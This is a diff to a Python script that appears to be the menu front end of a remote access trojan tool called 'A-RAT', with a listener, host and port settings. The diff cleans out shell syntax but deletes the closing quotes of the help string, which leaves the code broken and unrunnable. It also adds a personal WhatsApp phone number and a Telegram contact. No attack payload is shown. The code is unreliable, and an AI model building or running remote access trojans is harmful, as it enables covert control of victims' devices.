@@ -1,15 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-bi='\033[34;1m' #biru tua
-ij='\033[32;1m' #ijo
-pr='\033[35;1m' #pink
-cy='\033[36;1m' #biru nuda
-me='\033[31;1m' #merah
-pu='\033[37;1m' #putih
-bu='\e[1;30m' #abu abu
-ku='\033[33;1m' #kuning
-or='\033[1;38;5;208m' #oren
-clear
 import os, sys, subprocess
 from time import sleep
 os.system("clear")
@@ -24,7 +14,7 @@ def logo():
  print("""
 
 
-echo -e $me'\t  █████╗       ██████╗  █████╗ ████████╗'
+\t  █████╗       ██████╗  █████╗ ████████╗'
 \t██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝
 \t███████║█████╗██████╔╝███████║   ██║   
 \t██╔══██║╚════╝██╔══██╗██╔══██║   ██║   
@@ -48,9 +38,9 @@ def help():
        show values    : Show Host, Port And Output Value
        start listener : Start Your Conection Server
 
-  Please Report This bug To My FB
-  FB : https://m.facebook.com/sefina.dewi
-  FP : https://m.facebook.com/androsec1337cyberteam\n""")
+  Please Report This bug To My Kontak
+  WHATSAPP : https://api.whatsapp.com/send?phone=6289637763566
+  TELEGRAM : https://t.me/cdt28
 
 def main():
     global host, port, output
